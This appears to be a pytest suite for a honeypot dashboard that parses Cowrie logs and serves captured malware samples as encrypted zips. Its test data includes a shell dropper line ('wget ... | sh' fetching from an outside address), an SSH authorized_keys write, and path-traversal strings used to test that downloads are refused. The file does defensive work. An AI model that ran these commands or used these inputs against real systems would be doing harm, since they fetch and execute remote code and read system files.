import gzip
import hashlib
import io
import json
import os
import zipfile
from datetime import datetime, timedelta, timezone

import pytest
from fastapi.testclient import TestClient

from app.cowrie_parser import FileTransfer, parse_event
from app.db import connect
from app.ingester import CowrieIngester
from app.main import create_app
from app.session_files import backfill_session_files
from app.zipcrypto import encrypted_zip

PAYLOAD = b"#!/bin/sh\nwget http://198.51.100.7/x86 -O- | sh\n" * 50
SHA = hashlib.sha256(PAYLOAD).hexdigest()
OTHER_SHA = "b" * 64


def _event(eventid, session="s1", ts="2025-11-01T10:00:05.000000Z", **fields):
    return {"eventid": eventid, "session": session, "timestamp": ts, **fields}


DOWNLOAD = _event(
    "cowrie.session.file_download",
    url="http://198.51.100.7/x86",
    outfile=f"var/lib/cowrie/downloads/{SHA}",
    shasum=SHA,
)
REDIRECT = _event(
    "cowrie.session.file_download",
    ts="2025-11-01T10:00:06.000000Z",
    destfile="/root/.ssh/authorized_keys",
    duplicate=True,
    shasum=OTHER_SHA,
)
UPLOAD = _event(
    "cowrie.session.file_upload", session="s2", ts="2025-11-02T08:00:00.000000Z", filename=".16", shasum=SHA
)
FAILED = _event("cowrie.session.file_download.failed", ts="2025-11-01T10:00:07.000000Z", url="http://192.0.2.9/arm7")


# --- zip ---------------------------------------------------------------------------


def test_encrypted_zip_opens_with_the_password_only():
    archive = encrypted_zip(SHA, PAYLOAD, b"infected")
    with zipfile.ZipFile(io.BytesIO(archive)) as zf:
        info = zf.getinfo(SHA)
        assert info.flag_bits & 0x1  # encrypted
        assert info.file_size == len(PAYLOAD)
        assert zf.read(SHA, pwd=b"infected") == PAYLOAD
        with pytest.raises(RuntimeError):
            zf.read(SHA, pwd=b"wrong")
    # The plaintext must not leak into the archive.
    assert b"wget" not in archive


def test_encrypted_zip_handles_empty_and_binary_files():
    for data in (b"", os.urandom(70_000)):
        archive = encrypted_zip("f", data, b"infected")
        with zipfile.ZipFile(io.BytesIO(archive)) as zf:
            assert zf.read("f", pwd=b"infected") == data


# --- parsing and ingestion ---------------------------------------------------------


def test_parse_file_events():
    assert parse_event(DOWNLOAD) == FileTransfer("s1", "download", SHA, "http://198.51.100.7/x86", "", DOWNLOAD["timestamp"])
    assert parse_event(REDIRECT).kind == "redirect"
    assert parse_event(REDIRECT).filename == "/root/.ssh/authorized_keys"
    assert parse_event(UPLOAD).kind == "upload"
    assert parse_event(UPLOAD).filename == ".16"
    failed = parse_event(FAILED)
    assert (failed.kind, failed.shasum, failed.url) == ("failed", "", "http://192.0.2.9/arm7")


def _write_log(path, events):
    path.write_text("".join(json.dumps(e) + "\n" for e in events))


def test_live_ingestion_records_file_events_once(tmp_path):
    db = connect(tmp_path / "db.sqlite3")
    log = tmp_path / "cowrie.json"
    _write_log(log, [DOWNLOAD, REDIRECT, FAILED])
    CowrieIngester(db, log).tick()
    # The startup backfill reads the same lines again.
    backfill_session_files(db, log)
    assert db.execute("SELECT COUNT(*) AS n FROM session_files").fetchone()["n"] == 3


def test_backfill_reads_rotated_and_gzipped_logs_once(tmp_path):
    db = connect(tmp_path / "db.sqlite3")
    log = tmp_path / "cowrie.json"
    _write_log(tmp_path / "cowrie.json.2026-11-01", [DOWNLOAD, REDIRECT])
    with gzip.open(tmp_path / "cowrie.json.2026-10-31.gz", "wt") as fh:
        fh.write(json.dumps(FAILED) + "\nnot json\n")
    _write_log(log, [UPLOAD, {"eventid": "cowrie.command.input", "session": "s2", "input": "ls"}])

    assert backfill_session_files(db, log) == 4
    kinds = sorted(r["kind"] for r in db.execute("SELECT kind FROM session_files"))
    assert kinds == ["download", "failed", "redirect", "upload"]
    # Done once per database, even if more logs show up later.
    _write_log(tmp_path / "cowrie.json.2026-11-02", [_event("cowrie.session.file_upload", ts="x", shasum=SHA)])
    assert backfill_session_files(db, log) == 0


# --- API ---------------------------------------------------------------------------


def _client(tmp_path, readable=True):
    db = connect(tmp_path / "db.sqlite3")
    now = datetime.now(timezone.utc)
    recent = (now - timedelta(days=1)).strftime("%Y-%m-%dT%H:%M:%S.000000Z")
    db.executescript(
        f"""
        INSERT INTO sessions (session_id, src_ip, connect_time) VALUES ('s1', '203.0.113.5', '2025-11-01T10:00:00Z');
        INSERT INTO sessions (session_id, src_ip, connect_time) VALUES ('s2', '203.0.113.6', '{recent}');
        INSERT INTO sessions (session_id, src_ip, connect_time) VALUES ('s3', '203.0.113.6', '{recent}');
        """
    )
    for event in (DOWNLOAD, REDIRECT, FAILED, UPLOAD, {**UPLOAD, "session": "s3", "timestamp": recent}):
        from app.session_files import record_file_transfer

        record_file_transfer(db, parse_event(event))
    db.commit()
    downloads = tmp_path / "var" / "lib" / "cowrie" / "downloads"
    downloads.mkdir(parents=True)
    stored = downloads / SHA
    stored.write_bytes(PAYLOAD)
    if not readable:
        stored.chmod(0)
    app = create_app(db=db, start_background_tasks=False)
    app.state.cowrie_var_path = tmp_path / "var"
    return TestClient(app)


def test_session_detail_lists_its_files(tmp_path):
    body = _client(tmp_path).get("/api/sessions/s1").json()
    files = body["files"]
    assert [f["kind"] for f in files] == ["download", "redirect", "failed"]
    assert files[0]["size"] == len(PAYLOAD)
    assert files[1]["size"] is None  # Cowrie kept no copy
    assert files[2]["shasum"] == "" and files[2]["size"] is None


def test_files_list_groups_by_hash(tmp_path):
    body = _client(tmp_path).get("/api/files").json()
    assert body["total"] == 2
    top = body["items"][0]
    assert top["shasum"] == SHA
    assert (top["sessions"], top["ips"], top["events"]) == (3, 2, 3)
    assert top["kinds"] == ["download", "upload"]
    assert top["name"] == ".16"  # most frequent source
    assert top["size"] == len(PAYLOAD)
    assert body["totals"] == {"files": 2, "events": 4, "new_7d": 0, "failed": 1}
    (tmp_path / "x").mkdir()
    assert _client(tmp_path / "x").get("/api/files", params={"sort": "nope"}).status_code == 400


def test_file_detail(tmp_path):
    client = _client(tmp_path)
    body = client.get(f"/api/files/{SHA.upper()}").json()
    assert body["sessions"] == 3
    assert body["kinds"] == ["download", "upload"]
    assert {s["filename"] or s["url"] for s in body["sources"]} == {".16", "http://198.51.100.7/x86"}
    assert body["top_ips"][0] == {"ip": "203.0.113.6", "sessions": 2}
    assert len(body["recent_events"]) == 3
    assert client.get(f"/api/files/{'c' * 64}").status_code == 404
    assert client.get("/api/files/not-a-hash").status_code == 404


def test_download_serves_an_encrypted_zip(tmp_path):
    response = _client(tmp_path).get(f"/api/files/{SHA}/download")
    assert response.status_code == 200
    assert response.headers["content-type"] == "application/zip"
    assert f'filename="{SHA}.zip"' in response.headers["content-disposition"]
    with zipfile.ZipFile(io.BytesIO(response.content)) as zf:
        assert zf.read(SHA, pwd=b"infected") == PAYLOAD


def test_download_errors(tmp_path):
    client = _client(tmp_path)
    assert client.get(f"/api/files/{OTHER_SHA}/download").status_code == 404
    assert client.get("/api/files/..%2F..%2Fetc%2Fpasswd/download").status_code == 404


def test_download_refuses_symlinks(tmp_path):
    client = _client(tmp_path)
    target = tmp_path / "secret"
    target.write_text("not a sample")
    (tmp_path / "var" / "lib" / "cowrie" / "downloads" / OTHER_SHA).symlink_to(target)
    assert client.get(f"/api/files/{OTHER_SHA}/download").status_code == 404
    assert client.get("/api/sessions/s1").json()["files"][1]["size"] is None


@pytest.mark.skipif(os.geteuid() == 0, reason="root reads any file")
def test_download_unreadable_file_says_so(tmp_path):
    response = _client(tmp_path, readable=False).get(f"/api/files/{SHA}/download")
    assert response.status_code == 503
    assert "cowrie-downloads-perms" in response.json()["detail"]


def test_stored_file_names_are_exactly_64_hex_chars(tmp_path):
    from app.session_files import stored_size

    sha = "a" * 64
    # "$" in a regex also matches before a trailing newline: such a name must never reach the disk.
    (tmp_path / (sha + "\n")).write_bytes(b"x")
    assert stored_size(tmp_path, sha + "\n") is None
    (tmp_path / sha).write_bytes(b"abc")
    assert stored_size(tmp_path, sha) == 3


def test_download_refuses_names_that_only_start_with_a_hash(tmp_path):
    client = _client(tmp_path)
    assert client.get("/api/files/" + "a" * 64 + "zz/download").status_code == 404
    assert client.get("/api/files/" + "a" * 64 + "%0A/download").status_code == 404
